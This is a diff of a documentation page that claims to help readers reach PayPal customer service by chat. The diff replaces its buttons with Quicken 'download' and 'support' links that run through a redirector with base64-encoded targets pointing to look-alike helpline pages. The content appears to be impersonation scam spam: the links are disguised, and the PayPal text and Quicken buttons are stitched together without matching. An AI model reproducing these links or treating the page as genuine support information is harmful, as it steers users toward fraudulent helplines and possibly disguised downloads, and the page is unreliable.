@@ -100,17 +100,16 @@ If you're stuck and need real help, learning how to chat with a real person at P
 Whether it's a billing problem or a locked account, **PayPal customer service** via chat is one of the easiest and fastest ways to get real-time help — no long calls, no stress.
 
 
-    .. raw:: html
+  .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.paypal.com/us/smarthelp/contact-us" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
-            🔗 Chat with PayPal Now
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Download Quicken Now
         </a>
-        <a href="https://fm.ci/?aHR0cHM6Ly9wYXlwYWxoZWxwbGluZS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3Q=" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
-            🔗 PayPal Help Center
+        <a href="https://fm.ci/?aHR0cHM6Ly9jb250YWN0cXVpY2tlbmhlbHBsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Quicken Support Center
         </a>
-        <a href="https://fm.ci/?aHR0cHM6Ly9wYXlwYWxoZWxwbGluZS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3Q=" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
-            🔗 Reset PayPal Password
+        <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+            🔗 Reset Quicken Password
         </a>
     </div>
-
